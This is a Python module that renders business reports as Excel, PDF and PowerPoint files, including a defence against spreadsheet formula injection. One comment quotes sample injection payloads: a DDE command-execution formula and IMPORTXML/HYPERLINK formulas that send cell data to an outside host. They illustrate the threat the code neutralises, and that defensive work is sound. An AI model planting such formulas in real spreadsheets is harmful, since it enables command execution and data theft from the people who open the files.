"""Server-side report renderer — the backend twin of frontend/src/lib/export.tsx.

Both on-demand and scheduled sends generate files here so output is identical to
the browser export. A `payload` mirrors the frontend ExportPayload:

    payload = {
      "title": str,
      "subtitle": str | None,
      "filename": str,                     # base name, no extension
      "sheets": [ {
          "name": str,
          "columns": [ Column ],
          "rows": [ dict ],
      } ],
    }

A Column is a dict:
    {"header": str, "key": str}            # value = row[key]
    optional: "fn": callable(row)->value   # computed value (overrides key)
              "money": True                # format as $#,##0.00 / right-align
              "align": "right" | "left"

xlsx uses openpyxl (already a dep). pdf uses reportlab (added to requirements).
"""
import re
from io import BytesIO

# Visual parity with export.tsx: header fill #1E3A5F = rgb(30,58,95).
HEADER_RGB = (30, 58, 95)
MONEY_FMT = "$#,##0.00"


def _raw(col, row):
    """Underlying value for a cell (callable fn wins over key)."""
    fn = col.get("fn")
    if fn is not None:
        try:
            return fn(row)
        except Exception:
            return None
    return row.get(col["key"])


def _money_str(v):
    try:
        return f"${float(v or 0):,.2f}"
    except (TypeError, ValueError):
        return "$0.00"


def _display(col, row):
    v = _raw(col, row)
    if col.get("money"):
        # A MISSING money value renders BLANK, never $0.00 (index §23w / §4c) — the same rule as the
        # browser exporter's money(); a real zero still renders $0.00.
        return "" if v is None or v == "" else _money_str(v)
    return "" if v is None else str(v)


# ── CSV / Excel formula injection (H7, 2026-08-05 security audit) ────────────────────────────────
# These workbooks are EMAILED and WhatsApp'd to owners and DMs, so a payload sitting in tenant data
# travels to a human who opens it in Excel. openpyxl types any string starting with "=" as a FORMULA
# (`data_type == 'f'` → an <f> element), which is exactly the DDE/exfil vector:
#     =cmd|'/C calc'!A0        =IMPORTXML(CONCAT("http://x/",A1),"//a")     =HYPERLINK("http://x?"&A1)
# (Proven live, not assumed: see harness_export_xss_upload.py section A.)
#
# THE FIX PRESERVES THE VALUE EXACTLY. It does NOT prefix an apostrophe — openpyxl stores an
# apostrophe as a literal character (Excel's quote-prefix is a STYLE, not text), so prefixing would
# print `'-1234.56` into every report. Instead the cell is forced to a text cell
# (`data_type = 's'` → `<c t="inlineStr">`) and marked with Excel's own quotePrefix style. Displayed
# characters are byte-identical; Excel never evaluates it, and never re-evaluates it if edited.
#
# THE ANTI-REGRESSION RULE IS THE WHOLE POINT. A value that merely LOOKS dangerous but is ordinary
# business data is left completely untouched:
#   · money columns are written as real FLOATS with a number format — never strings — so they can
#     never enter this path at all;
#   · a plain numeric string ("-1234.56", "+250", "-1,234.56", "-$99.00", "-3.5%", "1e5") is a number
#     to Excel, not a formula, and is passed through unchanged;
#   · dates and phone numbers never start with "="; "+1 (555) 123-4567" IS neutralised, and still
#     displays character-for-character as typed.
_RISKY_LEAD = ("=", "+", "-", "@", "\t", "\r", "\n")

_NUMERICISH = re.compile(
    r"""^[+-]?                 # optional sign — the ONLY reason a legitimate cell starts with + or -
        \$?\s*                 # optional currency symbol ("-$1,234.56")
        (?:\d{1,3}(?:,\d{3})+|\d+)   # 1,234,567  or  1234567
        (?:\.\d+)?             # decimals
        (?:[eE][+-]?\d+)?      # scientific notation
        \s*%?$                 # optional trailing percent
    """,
    re.VERBOSE,
)


def _is_formula_risky(value) -> bool:
    """True only for a STRING that Excel/Sheets would evaluate, and that is not ordinary numeric data.
    Non-strings (int/float/Decimal/date/datetime/bool/None) can never be formulas → always False."""
    if not isinstance(value, str) or not value:
        return False
    if value[0] not in _RISKY_LEAD:
        return False
    return not _NUMERICISH.match(value.strip())


def _para(v) -> str:
    """Escape for reportlab's Paragraph mini-markup. Paragraph parses `& < >` as markup, so a store
    literally named "A & B" — or any tenant string containing `<` — makes doc.build() RAISE and the
    whole PDF send fail. Data cells were already escaped; the title, subtitle, sheet name and column
    headers were not, and all four carry tenant text. Same escape, one helper (2026-08-05)."""
    return str("" if v is None else v).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


def _write_text_cell(cell, value):
    """Force `cell` to a literal TEXT cell without altering a single displayed character."""
    cell.value = value
    cell.data_type = "s"          # <c t="inlineStr"> — never <f>
    try:
        cell.quotePrefix = True   # Excel's own "this is text" marker; survives a user edit
    except Exception:
        pass                      # older openpyxl → data_type alone is already sufficient


# ── Excel ────────────────────────────────────────────────────────────────────
def build_xlsx(payload: dict) -> bytes:
    from openpyxl import Workbook
    from openpyxl.styles import Font, PatternFill, Alignment

    wb = Workbook()
    wb.remove(wb.active)  # drop the default sheet; we add our own
    header_fill = PatternFill("solid", fgColor="1E3A5F")
    header_font = Font(bold=True, color="FFFFFF")
    right = Alignment(horizontal="right")

    sheets = payload.get("sheets") or []
    if not sheets:
        sheets = [{"name": "Report", "columns": [], "rows": []}]

    for sheet in sheets:
        name = (sheet.get("name") or "Sheet")
        # Excel sheet-name rules: <=31 chars, no \/?*[]:
        for ch in "\\/?*[]:":
            name = name.replace(ch, " ")
        name = name[:31] or "Sheet"
        ws = wb.create_sheet(title=name)
        cols = sheet.get("columns") or []
        rows = sheet.get("rows") or []

        # Header row (a column header is configurable in places, so it gets the same guard)
        for ci, col in enumerate(cols, start=1):
            hdr = col.get("header") or ""
            c = ws.cell(row=1, column=ci)
            if _is_formula_risky(hdr):
                _write_text_cell(c, hdr)
            else:
                c.value = hdr
            c.fill = header_fill
            c.font = header_font

        # Data rows
        for ri, row in enumerate(rows, start=2):
            for ci, col in enumerate(cols, start=1):
                if col.get("money"):
                    # Money is a real float + number format — it can never be a formula, and this is
                    # also why the H7 guard cannot touch a single currency figure.
                    raw = _raw(col, row)
                    if raw is None or raw == "":
                        # A MISSING money value is not zero (index §23w, 2026-09-10; the Excel half closed
                        # 2026-09-26, §4c): a withheld or not-computed cell is left EMPTY, never written as
                        # $0.00. A real zero is still a number.
                        cell = ws.cell(row=ri, column=ci)
                        cell.alignment = right
                        continue
                    try:
                        val = float(raw)
                    except (TypeError, ValueError):
                        val = 0.0
                    cell = ws.cell(row=ri, column=ci, value=val)
                    cell.number_format = MONEY_FMT
                    cell.alignment = right
                else:
                    v = _raw(col, row)
                    v = "" if v is None else v
                    cell = ws.cell(row=ri, column=ci)
                    if _is_formula_risky(v):
                        _write_text_cell(cell, v)   # H7: literal text, displayed value unchanged
                    else:
                        cell.value = v
                    if col.get("align") == "right":
                        cell.alignment = right

        # Column widths (mirror export.tsx heuristic)
        for ci, col in enumerate(cols, start=1):
            hdr = col.get("header") or ""
            width = max(len(hdr) + 2, 12 if col.get("money") else 16)
            ws.column_dimensions[ws.cell(row=1, column=ci).column_letter].width = width

    out = BytesIO()
    wb.save(out)
    return out.getvalue()


# ── PDF ──────────────────────────────────────────────────────────────────────
def build_pdf(payload: dict) -> bytes:
    from reportlab.lib import colors
    from reportlab.lib.pagesizes import A4, landscape
    from reportlab.lib.units import mm
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.platypus import (
        SimpleDocTemplate, Table, TableStyle, Paragraph, Spacer, PageBreak,
    )

    buf = BytesIO()
    page_w, page_h = landscape(A4)
    margin = 12 * mm
    avail_w = page_w - 2 * margin
    doc = SimpleDocTemplate(
        buf, pagesize=landscape(A4),
        leftMargin=margin, rightMargin=margin, topMargin=margin, bottomMargin=margin,
        title=payload.get("title") or "Report",
    )
    styles = getSampleStyleSheet()
    h1 = ParagraphStyle("rh1", parent=styles["Heading1"], fontSize=15, spaceAfter=2)
    sub = ParagraphStyle("rsub", parent=styles["Normal"], fontSize=9, textColor=colors.grey, spaceAfter=8)
    h2 = ParagraphStyle("rh2", parent=styles["Heading2"], fontSize=11, spaceBefore=8, spaceAfter=4)
    cell_style = ParagraphStyle("rcell", parent=styles["Normal"], fontSize=7, leading=8)
    head_style = ParagraphStyle("rhead", parent=styles["Normal"], fontSize=7, leading=8,
                                textColor=colors.white, fontName="Helvetica-Bold")
    header_color = colors.Color(HEADER_RGB[0] / 255, HEADER_RGB[1] / 255, HEADER_RGB[2] / 255)

    story = [Paragraph(_para(payload.get("title") or "Report"), h1)]
    if payload.get("subtitle"):
        story.append(Paragraph(_para(payload["subtitle"]), sub))

    sheets = payload.get("sheets") or []
    for si, sheet in enumerate(sheets):
        cols = sheet.get("columns") or []
        rows = sheet.get("rows") or []
        if len(sheets) > 1:
            story.append(Paragraph(f"{_para(sheet.get('name') or 'Sheet')}  ({len(rows)})", h2))
        if not cols:
            continue
        if not rows:
            story.append(Paragraph("<i>No rows.</i>", cell_style))
            story.append(Spacer(1, 6))
            continue

        # Header cells as Paragraphs so long headers wrap.
        header_cells = [Paragraph(_para(c.get("header") or ""), head_style) for c in cols]
        data = [header_cells]
        for row in rows:
            line = []
            for col in cols:
                txt = _para(_display(col, row))
                line.append(Paragraph(txt, cell_style))
            data.append(line)

        # Even column widths across the available page width (always fits).
        col_w = avail_w / len(cols)
        table = Table(data, colWidths=[col_w] * len(cols), repeatRows=1)
        style = [
            ("BACKGROUND", (0, 0), (-1, 0), header_color),
            ("GRID", (0, 0), (-1, -1), 0.25, colors.Color(0.8, 0.8, 0.8)),
            ("VALIGN", (0, 0), (-1, -1), "TOP"),
            ("TOPPADDING", (0, 0), (-1, -1), 2),
            ("BOTTOMPADDING", (0, 0), (-1, -1), 2),
            ("ROWBACKGROUNDS", (0, 1), (-1, -1), [colors.white, colors.Color(0.96, 0.97, 0.98)]),
        ]
        for ci, col in enumerate(cols):
            if col.get("money") or col.get("align") == "right":
                style.append(("ALIGN", (ci, 1), (ci, -1), "RIGHT"))
        table.setStyle(TableStyle(style))
        story.append(table)
        story.append(Spacer(1, 8))

    doc.build(story)
    return buf.getvalue()


PPTX_MIME = "application/vnd.openxmlformats-officedocument.presentationml.presentation"

# Deck palette. ONE declaration, reused by every slide master below — the same discipline the
# frontend's theme tokens enforce, for the same reason: a colour written twice drifts.
# ── THE DECK'S LOOK, declared once ───────────────────────────────────────────────────────────────
# Owner 2026-11-17, on the first in-app deck: *"this is not the same smart ppt as the firdst one"*.
# He was comparing it with the hand-built 17 Nov review deck, which carries a theme, stat cards,
# charts and a footer; this renderer drew a heading, a paragraph and a default table.
#
# EVERY VALUE THAT DECIDES HOW A SLIDE LOOKS LIVES IN THIS BLOCK. The drawing code below reads
# them; it spells no colour, font or measurement of its own, so the look can be changed in one
# place and cannot drift between slide kinds.
DECK_DARK = (22, 32, 63)        # title / section background
DECK_NAVY = (30, 39, 97)        # headings on a light slide, table header fill
DECK_CARD = (34, 48, 92)        # a stat card on a dark slide
DECK_CARD_ALERT = (58, 36, 32)  # a stat card carrying the number that hurts
DECK_ICE = (202, 220, 252)      # body text on a dark slide
DECK_MUTED = (110, 122, 153)    # eyebrows, notes, the footer
DECK_RED = (192, 57, 43)
DECK_AMBER = (217, 140, 0)
DECK_GREEN = (30, 138, 95)
DECK_WHITE = (255, 255, 255)
DECK_BAND = (241, 244, 250)     # banded table row
DECK_RULE = (210, 218, 235)     # hairline under a heading
#: A display face for headings and a text face for everything else — the pairing that makes a deck
#: read as designed rather than typed. Both ship with Office on Windows and macOS, so a slide opens
#: the same on the machine it is presented from.
DECK_TITLE_FONT = "Georgia"
DECK_BODY_FONT = "Calibri"
#: Tone names a slide may ask for on a card or a figure. A tone is a MEANING, not a colour — the
#: fold says "this is the number that hurts" and this block decides what that looks like.
DECK_TONES = {"plain": DECK_WHITE, "good": DECK_GREEN, "warn": DECK_AMBER, "bad": DECK_RED}


def _pptx_text(frame, lines, *, size, color, bold=False, space_after=6,
               font=DECK_BODY_FONT, align=None):
    """Fill a text frame with one paragraph per line. `lines` are already WORDS — this renderer
    never composes a sentence, because the sentences have one home in the fold that made them."""
    from pptx.util import Pt
    from pptx.dml.color import RGBColor
    from pptx.enum.text import PP_ALIGN
    frame.word_wrap = True
    first = True
    for line in [str(x) for x in (lines or []) if str(x or "").strip()]:
        para = frame.paragraphs[0] if first else frame.add_paragraph()
        first = False
        para.text = line
        para.space_after = Pt(space_after)
        if align:
            para.alignment = {"left": PP_ALIGN.LEFT, "right": PP_ALIGN.RIGHT,
                              "center": PP_ALIGN.CENTER}[align]
        for run in para.runs:
            run.font.size = Pt(size)
            run.font.bold = bold
            run.font.name = font
            run.font.color.rgb = RGBColor(*color)


def _pptx_rect(slide, x, y, w, h, fill):
    """A filled rectangle with no outline — the one shape every band, card and rule is made of."""
    from pptx.util import Inches
    from pptx.dml.color import RGBColor
    from pptx.enum.shapes import MSO_SHAPE
    shape = slide.shapes.add_shape(MSO_SHAPE.ROUNDED_RECTANGLE if h >= 0.5 else MSO_SHAPE.RECTANGLE,
                                   Inches(x), Inches(y), Inches(w), Inches(h))
    shape.fill.solid()
    shape.fill.fore_color.rgb = RGBColor(*fill)
    shape.line.fill.background()
    shape.shadow.inherit = False
    if shape.has_text_frame:
        shape.text_frame.text = ""
    return shape


def _pptx_cards(slide, cards, x, y, w, h, *, dark):
    """A row of stat cards: the figure big, its label small beneath it.

    A card is `{label, value, tone}`. `value` is already a STRING, formatted by whoever owns the
    figure — this renderer formats no number, for the same reason it composes no sentence. `tone`
    is one of DECK_TONES and decides the colour of the figure, never the words.
    """
    cards = [c for c in (cards or []) if c]
    if not cards:
        return y
    gap = 0.14
    cw = (w - gap * (len(cards) - 1)) / len(cards)
    for i, c in enumerate(cards):
        cx = x + i * (cw + gap)
        tone = str(c.get("tone") or "plain")
        fill = DECK_CARD_ALERT if tone == "bad" else (DECK_CARD if dark else DECK_BAND)
        _pptx_rect(slide, cx, y, cw, h, fill)
        vcolor = DECK_TONES.get(tone, DECK_WHITE)
        if not dark and tone == "plain":
            vcolor = DECK_NAVY
        value = str(c.get("value") or "")
        # A CARD'S FIGURE IS SET TO FIT, not clipped. A value is usually a short number and reads
        # best large; a worded value ("month to date") is longer and would overflow the card at the
        # same size, which is how a stat card stops looking designed.
        size = 26 if len(value) <= 10 else (19 if len(value) <= 18 else 14)
        _pptx_text(slide.shapes.add_textbox(_in(cx + 0.22), _in(y + 0.14),
                                            _in(cw - 0.44), _in(0.66)).text_frame,
                   [value], size=size, color=vcolor, bold=True,
                   font=DECK_TITLE_FONT, space_after=0)
        _pptx_text(slide.shapes.add_textbox(_in(cx + 0.22), _in(y + 0.82),
                                            _in(cw - 0.44), _in(h - 0.92)).text_frame,
                   str(c.get("label") or "").split("\n"), size=10.5,
                   color=DECK_ICE if dark else DECK_MUTED, space_after=1)
    return y + h + 0.3


def _in(v):
    from pptx.util import Inches
    return Inches(v)


def _pptx_chart(slide, spec, x, y, w, h):
    """A bar or line chart from `{type, categories, series: [{name, values}]}`.

    The fold decides WHAT is plotted; this decides what a plot looks like. A spec with no
    categories or no series draws nothing rather than an empty frame, because an empty chart reads
    as "measured, and the answer is nothing".
    """
    from pptx.chart.data import CategoryChartData
    from pptx.enum.chart import XL_CHART_TYPE, XL_LEGEND_POSITION
    from pptx.util import Pt
    from pptx.dml.color import RGBColor
    cats = [str(c) for c in ((spec or {}).get("categories") or [])]
    series = [s for s in ((spec or {}).get("series") or []) if (s or {}).get("values")]
    if not cats or not series:
        return False
    data = CategoryChartData()
    data.categories = cats
    for s in series:
        data.add_series(str(s.get("name") or ""),
                        [None if v is None else float(v) for v in s["values"]])
    kind = {"bar": XL_CHART_TYPE.COLUMN_CLUSTERED,
            "line": XL_CHART_TYPE.LINE_MARKERS}.get(str((spec or {}).get("type") or "bar"),
                                                    XL_CHART_TYPE.COLUMN_CLUSTERED)
    frame = slide.shapes.add_chart(kind, _in(x), _in(y), _in(w), _in(h), data)
    chart = frame.chart
    chart.has_title = False
    chart.has_legend = len(series) > 1
    if chart.has_legend:
        chart.legend.position = XL_LEGEND_POSITION.BOTTOM
        chart.legend.include_in_layout = False
        chart.legend.font.size = Pt(10)
    for axis in (chart.category_axis, chart.value_axis):
        axis.tick_labels.font.size = Pt(9)
        axis.tick_labels.font.color.rgb = RGBColor(*DECK_MUTED)
        axis.has_major_gridlines = axis is chart.value_axis
    # A NEGATIVE SERIES PUTS THE AXIS IN THE MIDDLE OF THE PLOT, and the category labels land on
    # top of the bars. Pinning them low keeps the store names under the chart where they are read.
    try:
        from pptx.enum.chart import XL_TICK_LABEL_POSITION
        chart.category_axis.tick_label_position = XL_TICK_LABEL_POSITION.LOW
    except Exception:
        pass
    palette = (DECK_NAVY, DECK_AMBER, DECK_GREEN)
    for i, plot_series in enumerate(chart.series):
        plot_series.format.fill.solid()
        plot_series.format.fill.fore_color.rgb = RGBColor(*palette[i % len(palette)])
    return True


def build_pptx(payload: dict) -> bytes:
    """A DECK out of `payload["slides"]` — the third format, beside xlsx and pdf.

    A slide is `{kind, eyebrow, title, bullets, cards, chart, table: {headers, rows} | None, note}`.
    The CONTENT is decided by whoever asked (for the weekly review that is
    `commcalc/weekly_review_deck.deck_payload`, a pure fold over the pack); this function only draws
    it, exactly as `build_xlsx` only draws a sheet. Owner ask 2026-11-17: *"The descriptive ppt is
    missing like one made before"*, and then, of the first one: *"this is not the same smart ppt as
    the firdst one"*.

    **THIS FUNCTION FORMATS NO FIGURE AND WRITES NO SENTENCE.** A card's `value` and a bullet's text
    arrive as words; a table cell goes through `_fmt_cell`, which is the house's one answer to "what
    does a cell look like". The design lives in the DECK_* block above and nowhere else, so every
    slide kind moves together.

    `cards` and `chart` are OPTIONAL and additive: a payload without them draws exactly what it drew
    before, and `render(payload, 'xlsx' | 'pdf')` ignores both, since those paths read `sheets`.
    """
    from pptx import Presentation
    from pptx.util import Inches, Pt
    from pptx.dml.color import RGBColor

    pres = Presentation()
    pres.slide_width, pres.slide_height = Inches(13.333), Inches(7.5)
    blank = pres.slide_layouts[6]
    W, H = 13.333, 7.5
    MARGIN = 0.8
    BODY_W = W - MARGIN * 2
    footer_text = " · ".join(x for x in [str(payload.get("title") or ""),
                                         str(payload.get("subtitle") or "")] if x)

    def _bg(slide, rgb):
        slide.background.fill.solid()
        slide.background.fill.fore_color.rgb = RGBColor(*rgb)

    def _box(slide, x, y, w, h):
        return slide.shapes.add_textbox(Inches(x), Inches(y), Inches(w), Inches(h)).text_frame

    slides = [s for s in (payload.get("slides") or [])]
    for number, s in enumerate(slides, start=1):
        kind = str(s.get("kind") or "item")
        slide = pres.slides.add_slide(blank)
        dark = kind in ("title", "section")
        if dark:
            _bg(slide, DECK_DARK if kind == "title" else DECK_NAVY)
        body_color = DECK_ICE if dark else (60, 60, 60)
        head_color = DECK_WHITE if dark else DECK_NAVY
        y = 2.3 if kind == "title" else (1.3 if dark else 0.45)
        if s.get("eyebrow"):
            _pptx_text(_box(slide, MARGIN, y, BODY_W, 0.4), [str(s["eyebrow"]).upper()],
                       size=13, color=DECK_ICE if dark else DECK_MUTED, bold=True)
            y += 0.45
        state = str(s.get("state") or "")
        # The headline figure carries its own meaning: a slide that says a loss says it in the
        # figure's colour. `tone` is the fold's word for how the figure reads; an unmeasured item
        # is red whatever it claims, because "not measured" is the thing to notice.
        tone = str(s.get("tone") or "plain")
        title_color = head_color
        if not dark:
            if state and state != "measured":
                title_color = DECK_RED
            elif tone in ("bad", "warn", "good"):
                title_color = DECK_TONES[tone]
        _pptx_text(_box(slide, MARGIN, y, BODY_W, 1.2 if dark else 0.9),
                   [s.get("title") or ""], size=38 if dark else 30, color=title_color, bold=True,
                   font=DECK_TITLE_FONT)
        y += 1.25 if dark else 0.95
        if not dark:
            # A hairline under the heading: the one piece of furniture that makes a slide look set
            # rather than typed, and it costs one shape.
            _pptx_rect(slide, MARGIN, y - 0.06, BODY_W, 0.02, DECK_RULE)
            y += 0.12
        if s.get("cards"):
            y = _pptx_cards(slide, s["cards"], MARGIN, y, BODY_W, 1.35, dark=dark)
        bullets = list(s.get("bullets") or [])
        table = s.get("table")
        chart = s.get("chart")
        side_by_side = bool(bullets and (table or chart))
        left_w = 5.3 if side_by_side else BODY_W
        if bullets:
            _pptx_text(_box(slide, MARGIN, y, left_w, max(0.6, H - y - 0.85)),
                       bullets, size=15 if not dark else 16, color=body_color, space_after=10)
        right_x = MARGIN + left_w + 0.5 if side_by_side else MARGIN
        right_w = W - right_x - MARGIN
        drew_chart = False
        if chart:
            drew_chart = _pptx_chart(slide, chart, right_x, y, right_w,
                                     min(3.6, max(1.8, H - y - 0.9)))
        if table and (table.get("rows") or []) and not drew_chart:
            headers = [str(h) for h in (table.get("headers") or [])]
            rows = table.get("rows") or []
            row_h = 0.32
            shape = slide.shapes.add_table(len(rows) + 1, max(1, len(headers)),
                                           Inches(right_x), Inches(y),
                                           Inches(right_w), Inches(row_h * (len(rows) + 1)))
            tbl = shape.table
            tbl.first_row = True
            for ci, h in enumerate(headers):
                cell = tbl.cell(0, ci)
                cell.text = h
                cell.fill.solid()
                cell.fill.fore_color.rgb = RGBColor(*DECK_NAVY)
                for para in cell.text_frame.paragraphs:
                    for run in para.runs:
                        run.font.size, run.font.bold = Pt(10), True
                        run.font.name = DECK_BODY_FONT
                        run.font.color.rgb = RGBColor(*DECK_WHITE)
            for ri, row in enumerate(rows, start=1):
                for ci in range(len(headers)):
                    v = row[ci] if ci < len(row) else None
                    cell = tbl.cell(ri, ci)
                    cell.text = "" if v is None or v == "" else _fmt_cell(v)
                    cell.fill.solid()
                    cell.fill.fore_color.rgb = RGBColor(*(DECK_BAND if ri % 2 else DECK_WHITE))
                    for para in cell.text_frame.paragraphs:
                        # A number reads against its column when it is right-aligned, and a word
                        # reads against the left edge. The cell decides from what it HOLDS, so a
                        # measurement claim in a figure column ("no target saved") still reads.
                        if isinstance(v, (int, float)) and not isinstance(v, bool):
                            from pptx.enum.text import PP_ALIGN
                            para.alignment = PP_ALIGN.RIGHT
                        for run in para.runs:
                            run.font.size = Pt(9)
                            run.font.name = DECK_BODY_FONT
                            run.font.color.rgb = RGBColor(40, 40, 40)
        # ── THE FOOTER. Every slide but the title says which pack it came from and where it sits,
        #    so a slide screenshotted into a chat can still be placed.
        if kind != "title":
            _pptx_rect(slide, 0, H - 0.5, W, 0.015, DECK_RULE if not dark else DECK_CARD)
            if footer_text:
                _pptx_text(_box(slide, MARGIN, H - 0.46, BODY_W - 1.0, 0.34), [footer_text],
                           size=9, color=DECK_ICE if dark else DECK_MUTED)
            _pptx_text(_box(slide, W - MARGIN - 0.9, H - 0.46, 0.9, 0.34), [str(number)],
                       size=9, color=DECK_ICE if dark else DECK_MUTED, align="right")
        if s.get("note"):
            _pptx_text(_box(slide, MARGIN, H - 0.95, BODY_W, 0.4), [s["note"]],
                       size=9, color=DECK_ICE if dark else DECK_MUTED)
    buf = BytesIO()
    pres.save(buf)
    return buf.getvalue()


def _fmt_cell(v):
    """A table cell as text. A number keeps thousands separators and cents; anything else is its own
    words — a WORD in a figure column is a measurement claim ("no target saved") and must survive
    into the deck as itself, never as 0."""
    if isinstance(v, bool):
        return "yes" if v else "no"
    if isinstance(v, (int, float)):
        return f"{v:,.2f}" if isinstance(v, float) else f"{v:,}"
    return str(v)


def render(payload: dict, fmt: str) -> tuple[bytes, str, str]:
    """Return (bytes, filename, mime) for fmt in {'xlsx','pdf','pptx'}."""
    base = payload.get("filename") or "report"
    if fmt == "xlsx":
        return (build_xlsx(payload), f"{base}.xlsx",
                "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet")
    if fmt == "pdf":
        return build_pdf(payload), f"{base}.pdf", "application/pdf"
    if fmt == "pptx":
        return build_pptx(payload), f"{base}.pptx", PPTX_MIME
    raise ValueError(f"unknown format {fmt!r}")
